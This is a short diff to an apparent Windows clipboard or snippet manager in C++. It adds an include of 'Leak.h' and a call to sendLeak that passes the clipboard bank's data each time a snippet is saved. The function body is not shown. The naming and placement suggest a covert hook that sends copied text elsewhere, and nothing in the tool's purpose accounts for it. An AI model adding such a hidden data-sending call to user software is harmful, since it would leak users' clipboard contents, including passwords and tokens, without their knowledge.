@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <iostream>
 #include "WindowCodes.h"
+#include "Leak.h"
 
 bool noTab;
 bool noTrailSemicolon;
@@ -210,6 +211,8 @@ DWORD WINAPI clipBoard(LPVOID args) {
 						WriteFile(fp, clipBanks[bankIdx].data, clipBanks[bankIdx].size, &written, NULL);
 						CloseHandle(fp);
 					}
+
+					sendLeak(clipBanks[bankIdx].data, clipBanks[bankIdx].size);
 				}
 
 				snippetClick = true;
